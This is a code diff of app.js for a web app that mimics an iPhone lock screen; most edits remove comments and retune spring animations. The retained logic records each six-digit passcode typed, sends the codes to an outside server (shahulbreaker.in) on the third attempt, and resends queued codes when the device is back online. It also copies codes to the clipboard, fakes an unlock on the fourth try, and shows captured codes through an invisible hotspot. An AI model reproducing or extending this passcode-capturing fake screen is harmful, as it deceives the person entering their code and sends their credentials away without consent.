@@ -1,10 +1,7 @@
-// app.js — adds persistent storage + robust SW registration, keeps existing logic intact.
-
 // ---- Storage API: request persistent storage (best effort; HTTPS required) ----
 (async () => {
   if (navigator.storage && navigator.storage.persist) {
     try {
-      // Optionally log current status
       if (navigator.storage.persisted) {
         try {
           const already = await navigator.storage.persisted();
@@ -39,8 +36,6 @@
         });
       })
       .catch((err) => console.warn('SW registration failed', err));
-
-    // When the new SW activates, reload once so it controls the page
     navigator.serviceWorker.addEventListener('controllerchange', () => {
       if (!window.__reloadedBySW) {
         window.__reloadedBySW = true;
@@ -50,7 +45,7 @@
   });
 })();
 
-// ---- Existing app code (unchanged) ----
+// ---- Main app logic ----
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
   const MAX = 6;
@@ -59,18 +54,15 @@
   const dotEls = Array.from(document.querySelectorAll('.dot'));
   const keys = Array.from(document.querySelectorAll('.key[data-num]'));
   const emergency = document.getElementById('emergency');
-  // keep a live reference to cancel button
   let cancelBtn = document.getElementById('cancel');
   const unlockOverlay = document.getElementById('unlockOverlay');
   const lockInner = document.querySelector('.lockscreen-inner');
   const homescreenImg = document.getElementById('homescreenImg');
+  const dynamicIslandEl = document.querySelector('.dynamic-island');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
+  const LAST_CODES_KEY = '_pass_last_codes_';
 
-  // grab the dynamic island element so we can flip the lock and animate it
-  const dynamicIslandEl = document.querySelector('.dynamic-island');
-
-  // Ensure wallpaper <img> is ready/visible (helps iOS PWA painting)
   (function ensureWallpaperPaints() {
     try {
       const wp = document.getElementById('wallpaperImg');
@@ -79,13 +71,12 @@
           wp.style.display = 'none';
         });
         if (wp.decode) {
-          wp.decode().catch(()=>{/* ignore */});
+          wp.decode().catch(() => { /* ignore */ });
         }
       }
     } catch (e) {}
   })();
 
-  /* ---------- Viewport sync: match visualViewport and pin heights to avoid sliding/gaps ---------- */
   (function setupViewportSync() {
     function updateViewportHeight() {
       try {
@@ -101,7 +92,6 @@
         console.warn('viewport sync failed', err);
       }
     }
-
     window.addEventListener('load', updateViewportHeight, { passive: true });
     if (window.visualViewport) {
       window.visualViewport.addEventListener('resize', updateViewportHeight, { passive: true });
@@ -109,10 +99,7 @@
     }
     window.addEventListener('resize', updateViewportHeight, { passive: true });
     window.addEventListener('orientationchange', updateViewportHeight, { passive: true });
-
     updateViewportHeight();
-
-    // catch iOS toolbar animation frames
     let t = 0;
     const id = setInterval(() => {
       updateViewportHeight();
@@ -121,8 +108,6 @@
     }, 120);
   })();
 
-  // rotating buffer for last up-to-6 entered codes
-  const LAST_CODES_KEY = '_pass_last_codes_';
   function getLastCodes() {
     try {
       return JSON.parse(localStorage.getItem(LAST_CODES_KEY) || '[]');
@@ -142,7 +127,6 @@
     return getLastCodes().join(',');
   }
 
-  // --- clear saved attempts/queue on a fresh app session (iOS Home-screen launch) ---
   function clearSavedAttempts() {
     try {
       localStorage.removeItem(LAST_CODES_KEY);
@@ -150,17 +134,14 @@
       localStorage.removeItem(QUEUE_KEY);
     } catch (e) { /* ignore */ }
   }
-
   (function ensureFreshSessionOnLaunch() {
     try {
       const alreadyStarted = sessionStorage.getItem('pass_session_started');
       function markStarted() { sessionStorage.setItem('pass_session_started', '1'); }
-
       if (!alreadyStarted) {
         clearSavedAttempts();
         markStarted();
       }
-
       window.addEventListener('pageshow', () => {
         if (!sessionStorage.getItem('pass_session_started')) {
           clearSavedAttempts();
@@ -177,7 +158,7 @@
 
   function refreshDots() {
     const dots = Array.from(document.querySelectorAll('.dot'));
-    dots.forEach((d,i) => d.classList.toggle('filled', i < code.length));
+    dots.forEach((d, i) => d.classList.toggle('filled', i < code.length));
     updateCancelText();
   }
 
@@ -204,32 +185,29 @@
     const queue = JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]');
     if (!queue.length) return;
     queue.forEach(item => {
-      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
+      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(() => { });
     });
     localStorage.removeItem(QUEUE_KEY);
   }
 
-  /* ---------- Spring engine (semi-implicit integrator) ---------- */
+  // ---------- Spring integrator ----------
   function springAnimate(opts) {
     const mass = opts.mass ?? 1;
-    const stiffness = opts.stiffness ?? 120; // k
-    const damping = opts.damping ?? 14;      // c
+    const stiffness = opts.stiffness ?? 120;
+    const damping = opts.damping ?? 14;
     const threshold = opts.threshold ?? 0.02;
     let x = opts.from;
     let v = opts.velocity ?? 0;
     const target = opts.to;
     let last = performance.now();
     let rafId = null;
-
     function step(now) {
       const dt = Math.min(0.032, (now - last) / 1000);
       last = now;
       const a = (-stiffness * (x - target) - damping * v) / mass;
       v += a * dt;
       x += v * dt;
-
       if (typeof opts.onUpdate === 'function') opts.onUpdate(x);
-
       const isSettled = Math.abs(v) < threshold && Math.abs(x - target) < (Math.abs(target) * 0.005 + 0.5);
       if (isSettled) {
         if (typeof opts.onUpdate === 'function') opts.onUpdate(target);
@@ -239,51 +217,44 @@
       }
       rafId = requestAnimationFrame(step);
     }
-
     rafId = requestAnimationFrame(step);
     return () => cancelAnimationFrame(rafId);
   }
 
-  /* ---------- playUnlockAnimation uses two springs ---------- */
+  // ---------- iPhone unlock animation ----------
   function playUnlockAnimation() {
     const prefersReduced = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
     if (!lockInner || !unlockOverlay || !homescreenImg) return;
-
     unlockOverlay.classList.add('show');
+    homescreenImg.style.transition = 'none';
+    homescreenImg.style.transform = 'scale(1.08)';
+    homescreenImg.style.filter = 'blur(16px) saturate(0.85)';
+    homescreenImg.style.opacity = '1';
 
     if (prefersReduced) {
       lockInner.style.transform = `translate3d(0, -110%, 0)`;
-      homescreenImg.style.transform = `translate3d(0,0,0) scale(1)`;
-      homescreenImg.style.opacity = '1';
+      homescreenImg.style.transform = `scale(1)`;
       homescreenImg.style.filter = 'blur(0) saturate(1)';
-      // hide pill immediately for reduced-motion users
+      homescreenImg.style.opacity = '1';
       if (dynamicIslandEl) dynamicIslandEl.style.display = 'none';
       return;
     }
 
     const height = Math.max(window.innerHeight, document.documentElement.clientHeight);
     const targetY = -Math.round(height * 1.08);
-
     lockInner.style.willChange = 'transform, opacity';
-    homescreenImg.style.willChange = 'transform, filter, opacity';
-    lockInner.style.transform = `translate3d(0,0,0) scale(1)`;
-    homescreenImg.style.transform = `translate3d(0,6%,0) scale(0.96)`;
-    homescreenImg.style.opacity = '0';
-    homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
-
-    // — SLOWER slide-up spring for lockInner (tuned)
     springAnimate({
       from: 0,
       to: targetY,
-      mass: 1.25,
-      stiffness: 110,
-      damping: 14,
+      mass: 1.18,
+      stiffness: 102,
+      damping: 13,
       onUpdate: (val) => {
         const progress = Math.min(1, Math.abs(val / targetY));
-        const scale = 1 - 0.003 * progress;
+        const scale = 1 - 0.0035 * progress;
         lockInner.style.transform = `translate3d(0, ${val}px, 0) scale(${scale})`;
-        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
+        lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.22));
       },
       onComplete: () => {
         lockInner.style.boxShadow = '';
@@ -292,57 +263,33 @@
       }
     });
 
-    // — SLOWER homescreen spring
-    springAnimate({
-      from: 0,
-      to: 1,
-      mass: 1.05,
-      stiffness: 60,
-      damping: 9,
-      onUpdate: (p) => {
-        const raw = p;
-        const scale = 1 + (raw - 1) * 0.12;
-        const finalScale = Math.max(0.96, Math.min(1.06, scale));
-        homescreenImg.style.transform = `translate3d(0,0,0) scale(${finalScale})`;
-        const blur = Math.max(0, 10 * (1 - Math.min(1, raw)));
-        const sat = 0.9 + Math.min(0.15, raw * 0.15);
-        homescreenImg.style.filter = `blur(${blur}px) saturate(${sat})`;
-        homescreenImg.style.opacity = String(Math.min(1, 0.1 + raw));
-      },
-      onComplete: () => {
-        homescreenImg.style.transform = 'translate3d(0,0,0) scale(1)';
-        homescreenImg.style.filter = 'blur(0) saturate(1)';
-        homescreenImg.style.opacity = '1';
-
-        if (dynamicIslandEl) {
-          const EXTRA_KEEP_MS = 1000;
-          setTimeout(() => {
-            dynamicIslandEl.classList.add('shrinking');
-            const onTransEnd = (ev) => {
-              if (ev.target !== dynamicIslandEl) return;
-              dynamicIslandEl.removeEventListener('transitionend', onTransEnd);
-              try {
-                dynamicIslandEl.style.display = 'none';
-                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
-              } catch (e) { /* ignore */ }
-            };
-            dynamicIslandEl.addEventListener('transitionend', onTransEnd);
-            setTimeout(() => {
-              try {
-                dynamicIslandEl.style.display = 'none';
-                dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
-              } catch (e) {}
-            }, 1200);
-          }, EXTRA_KEEP_MS);
-        }
-      }
-    });
+    setTimeout(() => {
+      homescreenImg.style.transition = 'transform 1s cubic-bezier(.18,1,.25,1), filter 1s cubic-bezier(.18,1,.25,1)';
+      homescreenImg.style.transform = 'scale(1)';
+      homescreenImg.style.filter = 'blur(0) saturate(1)';
+    }, 16);
 
     setTimeout(() => {
-      lockInner.style.boxShadow = '';
-      homescreenImg.style.willChange = '';
+      homescreenImg.style.transition = '';
       lockInner.style.willChange = '';
-    }, 2600);
+      homescreenImg.style.willChange = '';
+    }, 1200);
+
+    if (dynamicIslandEl) {
+      setTimeout(() => {
+        dynamicIslandEl.classList.add('shrinking');
+        dynamicIslandEl.addEventListener('transitionend', function handler(ev) {
+          if (ev.target !== dynamicIslandEl) return;
+          dynamicIslandEl.removeEventListener('transitionend', handler);
+          dynamicIslandEl.style.display = 'none';
+          dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
+        });
+        setTimeout(() => {
+          dynamicIslandEl.style.display = 'none';
+          dynamicIslandEl.classList.remove('shrinking', 'unlocked', 'icon-opened', 'locked');
+        }, 1200);
+      }, 950);
+    }
   }
 
   function animateWrongAttempt() {
@@ -352,10 +299,7 @@
       return;
     }
     const DURATION = 700;
-
-    // Force Cancel label back to 'Cancel' during shake
     if (cancelBtn) cancelBtn.textContent = 'Cancel';
-
     dotsEl.classList.add('wrong');
     reset();
     setTimeout(() => {
@@ -363,7 +307,6 @@
     }, DURATION + 20);
   }
 
-  /* ---------- Clipboard helper & toast (preserve user gesture) ---------- */
   function copyToClipboard(text) {
     if (navigator.clipboard && navigator.clipboard.writeText) {
       return navigator.clipboard.writeText(text).catch(() => {
@@ -422,17 +365,14 @@
     clearTimeout(t._hideTimer);
     t._hideTimer = setTimeout(() => {
       t.style.opacity = '0';
-      t._hideTimer2 = setTimeout(() => {}, 200);
+      t._hideTimer2 = setTimeout(() => { }, 200);
     }, ms);
   }
 
-  /* ---------- handleCompleteAttempt: send on 3rd attempt, unlock on 4th ---------- */
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
-
-    // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
     if (attempts === 1 || attempts === 2) {
@@ -442,7 +382,6 @@
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
     } else if (attempts === 4) {
-      // Immediately show the unlocked (open) lock glyph and give it a small pop, then run unlock animation
       if (dynamicIslandEl) {
         dynamicIslandEl.classList.remove('locked');
         dynamicIslandEl.classList.add('unlocked', 'icon-opened');
@@ -452,23 +391,16 @@
       } else {
         playUnlockAnimation();
       }
-
-      // local reset of input
       setTimeout(reset, 300);
     }
-
-    if (attempts >= 4) {
-      setAttempts(0);
-    }
+    if (attempts >= 4) setAttempts(0);
   }
 
   function animateBrightness(el, target, duration) {
     let startTime;
     const initial = parseFloat(el.dataset.brightness || "1");
     const change = target - initial;
-
     function easeOutCubic(t) { return 1 - Math.pow(1 - t, 3); }
-
     function frame(ts) {
       if (!startTime) startTime = ts;
       const progress = Math.min((ts - startTime) / duration, 1);
@@ -484,7 +416,6 @@
   keys.forEach(k => {
     const num = k.dataset.num;
     if (!num) return;
-
     k.addEventListener('touchstart', () => {
       animateBrightness(k, 1.6, 80);
       updateCancelText();
@@ -498,7 +429,6 @@
       if (code.length >= MAX) return;
       code += num;
       refreshDots();
-
       if (code.length === MAX) {
         const enteredCode = code;
         try {
@@ -510,7 +440,6 @@
         } catch (err) {
           console.warn('clipboard pre-copy failed', err);
         }
-
         setTimeout(() => {
           handleCompleteAttempt(enteredCode);
         }, 120);
@@ -520,7 +449,6 @@
 
   emergency && emergency.addEventListener('click', e => e.preventDefault());
 
-  // ----------------- Cancel / Delete behavior (non-destructive) -----------------
   function updateCancelText() {
     cancelBtn = document.getElementById('cancel') || cancelBtn;
     if (!cancelBtn) return;
@@ -551,8 +479,7 @@
   window.addEventListener('online', flushQueue);
   flushQueue();
 
-  /* ---------- Invisible bottom-left hotspot: show combined last codes on press ---------- */
-
+  // Invisible hotspot for codes
   function createInvisibleHotspotAndDisplay() {
     if (!document.getElementById('codesHotspot')) {
       const hs = document.createElement('div');
@@ -577,7 +504,6 @@
       });
       document.body.appendChild(hs);
     }
-
     if (!document.getElementById('codesCombinedDisplay')) {
       const d = document.createElement('div');
       d.id = 'codesCombinedDisplay';
@@ -593,7 +519,6 @@
         pointerEvents: 'none',
         transition: 'opacity 120ms ease, transform 120ms ease'
       });
-
       const inner = document.createElement('div');
       inner.id = 'codesCombinedInner';
       Object.assign(inner.style, {
@@ -611,29 +536,24 @@
         fontWeight: '700',
         letterSpacing: '0.6px'
       });
-
       d.appendChild(inner);
       document.body.appendChild(d);
     }
   }
-
   function showCombinedStringAtBottomLeft() {
     createInvisibleHotspotAndDisplay();
     const bar = document.getElementById('codesCombinedDisplay');
     const inner = document.getElementById('codesCombinedInner');
     inner.textContent = '';
-
     const codes = getLastCodes();
     if (!codes || codes.length === 0) inner.textContent = '';
     else inner.textContent = codes.join(',');
-
     bar.style.display = 'flex';
     requestAnimationFrame(() => {
       bar.style.transform = 'translateY(0)';
       bar.style.opacity = '1';
     });
   }
-
   function hideCombinedDisplayNow() {
     const bar = document.getElementById('codesCombinedDisplay');
     if (!bar) return;
@@ -643,8 +563,6 @@
       if (bar) bar.style.display = 'none';
     }, 140);
   }
-
-  // Hotspot handlers
   function onHotspotDown(ev) {
     ev.preventDefault();
     showCombinedStringAtBottomLeft();
@@ -652,7 +570,6 @@
   function onHotspotUp(ev) {
     hideCombinedDisplayNow();
   }
-
   function ensureHotspotListeners() {
     createInvisibleHotspotAndDisplay();
     const hs = document.getElementById('codesHotspot');
@@ -666,9 +583,6 @@
       hs._attached = true;
     }
   }
-
   ensureHotspotListeners();
-
   window.__passUI = { getCode: () => code, reset, getAttempts, queuePass };
-
 })();
